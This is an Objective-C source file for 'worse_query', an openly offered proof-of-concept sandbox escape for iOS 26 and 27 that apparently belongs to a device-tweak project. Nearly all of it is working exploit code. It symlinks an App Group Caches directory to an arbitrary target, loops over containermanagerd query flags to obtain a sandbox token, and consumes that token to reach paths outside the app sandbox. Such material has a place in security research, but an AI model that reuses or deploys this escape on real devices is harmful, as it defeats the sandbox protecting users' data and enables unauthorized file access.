//
//  worse_query.m
//  GestaltTweak
//
//  Created by Taj C on 8/20/26.
//  forcequitOS/worse_query
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"
#import "BQCore.h"
#import "GXEntitlementsReader.h"
#import "GTLog.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

bool worse_query_available(void) {
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return false;
    void *query_create = dlsym(mgr, "container_query_create");
    void *consume_extension = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    dlclose(mgr);
    return (query_create != NULL && consume_extension != NULL);
}

static void clean_symlink_path(NSString *cachesPath) {
    if (cachesPath.length == 0) return;
    NSFileManager *files = [NSFileManager defaultManager];
    [files removeItemAtPath:cachesPath error:nil];
    [files createDirectoryAtPath:cachesPath withIntermediateDirectories:true attributes:nil error:nil];
}

// Executes containermanagerd query for a target using Class 7 (App Group)
static int64_t execute_query_for_target(NSString *target,
                                        NSString *identifier,
                                        NSString *cachesPath,
                                        uint64_t containerClass,
                                        bool alt_flags,
                                        void *mgr) {
    NSFileManager *files = [NSFileManager defaultManager];
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_identifiers_fn query_set_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    if (!query_create || !query_set_class || (!query_set_group_identifiers && !query_set_identifiers) ||
        !query_set_flags || !query_set_part || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        GTLog(@"[worse_query] Failed to resolve required private symbols (unsupported OS)");
        return -2;
    }
    
    // Set up symlink: Library/Caches -> target
    [files removeItemAtPath:cachesPath error:nil];
    if ([files createSymbolicLinkAtPath:cachesPath withDestinationPath:target error:nil] == false) {
        GTLog(@"[worse_query] Failed to create symlink at %@ -> %@", cachesPath, target);
        clean_symlink_path(cachesPath);
        return -4;
    }
    
    uint64_t flagCandidates[3];
    if (alt_flags) {
        flagCandidates[0] = 0x0000000800000000ULL;
        flagCandidates[1] = 0x8100000000ULL;
        flagCandidates[2] = 0x0000008000000000ULL;
    } else {
        flagCandidates[0] = 0x8100000000ULL;
        flagCandidates[1] = 0x0000008000000000ULL;
        flagCandidates[2] = 0x0000000800000000ULL;
    }
    
    void *result = NULL;
    void *successfulQuery = NULL;
    
    for (int f = 0; f < 3 && result == NULL; f++) {
        uint64_t currentFlags = flagCandidates[f];
        for (int variant = 0; variant < 4 && result == NULL; variant++) {
            void *query = query_create();
            if (!query) continue;
            
            query_set_class(query, containerClass);
            query_set_part(query, 3);
            query_set_flags(query, currentFlags);
            
            xpc_object_t idObj = NULL;
            if (variant % 2 == 0) {
                idObj = xpc_string_create(identifier.UTF8String);
            } else {
                idObj = xpc_array_create(nil, 0);
                xpc_array_set_string(idObj, XPC_ARRAY_APPEND, identifier.UTF8String);
            }
            
            if (variant < 2 && query_set_group_identifiers) {
                query_set_group_identifiers(query, idObj);
            } else if (query_set_identifiers) {
                query_set_identifiers(query, idObj);
            } else if (query_set_group_identifiers) {
                query_set_group_identifiers(query, idObj);
            }
            
#if !OS_OBJECT_USE_OBJC
            xpc_release(idObj);
#endif
            
            result = query_get_single_result(query);
            if (result) {
                successfulQuery = query;
                GTLog(@"[worse_query] Query returned container result (flags=0x%llx)", currentFlags);
                break;
            } else {
                query_free(query);
            }
        }
    }
    
    if (!result) {
        GTLog(@"[worse_query] containermanagerd rejected query for group %@", identifier);
        clean_symlink_path(cachesPath);
        return -5;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        GTLog(@"[worse_query] Failed to copy sandbox token from query result");
        query_free(successfulQuery);
        clean_symlink_path(cachesPath);
        return -6;
    }
    
    int64_t handle = consume_extension(token);
    query_free(successfulQuery);
    free(token);
    clean_symlink_path(cachesPath);
    
    if (handle >= 0) {
        GTLog(@"[worse_query] Extension consumed successfully: handle=%lld", handle);
    } else {
        GTLog(@"[worse_query] Failed to consume sandbox extension (handle=%lld)", handle);
    }
    
    return handle;
}

// worse_query sandbox escape supporting dynamically discovered App Group
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    GTLog(@"[worse_query] Begin: target=%@ group=%@ alt_flags=%d create_dir=%d", target, group, alt_flags, create_dir);

    // Fast path: Gester BQEscape (full 6-tier cascade including LiveContainer App Group symlink)
    NSString *link = nil;
    int64_t bqHandle = BQEscape(target, &link);
    if (bqHandle >= 0) {
        GTLog(@"[worse_query] BQEscape succeeded via Gester engine (handle=%lld link=%@)", bqHandle, link);
        return bqHandle;
    }
    
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) {
            GTLog(@"[worse_query] Target lstat check failed, return=-255");
            return -255;
        }
    }
    
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        GTLog(@"[worse_query] Load libsystem_containermanager.dylib failed");
        return -2;
    }
    
    NSFileManager *files = [NSFileManager defaultManager];
    
    NSString *cleanGroup = group;
    if (cleanGroup.length > 0 && ![cleanGroup hasPrefix:@"group."]) {
        cleanGroup = [@"group." stringByAppendingString:cleanGroup];
    }
    
    NSURL *groupRoot = nil;
    if (cleanGroup.length > 0) {
        groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:cleanGroup];
    }
    
    if (!groupRoot) {
        cleanGroup = [GXEntitlementsReader usableAppGroup];
        if (cleanGroup.length > 0) {
            groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:cleanGroup];
        }
    }
    
    if (!groupRoot) {
        for (NSString *candidate in [GXEntitlementsReader allAppGroups]) {
            if (![candidate hasPrefix:@"group."]) continue;
            groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:candidate];
            if (groupRoot) {
                cleanGroup = candidate;
                break;
            }
        }
    }
    
    if (groupRoot) {
        GTLog(@"[worse_query] App Group resolved: %@", cleanGroup);
        NSURL *libraryURL = [groupRoot URLByAppendingPathComponent:@"Library"];
        if (![files fileExistsAtPath:libraryURL.path]) {
            [files createDirectoryAtURL:libraryURL withIntermediateDirectories:YES attributes:nil error:nil];
        }
        NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
        int64_t handle = execute_query_for_target(target, cleanGroup, caches, 7, alt_flags, mgr);
        dlclose(mgr);
        return handle;
    }
    
    GTLog(@"[worse_query] App Group container unavailable, return=-1");
    dlclose(mgr);
    return -1;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    BQEndEscape(handle);
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) {
        int res = release_extension(handle);
        GTLog(@"[worse_query] Extension release: handle=%lld result=%d", handle, res);
    }
}
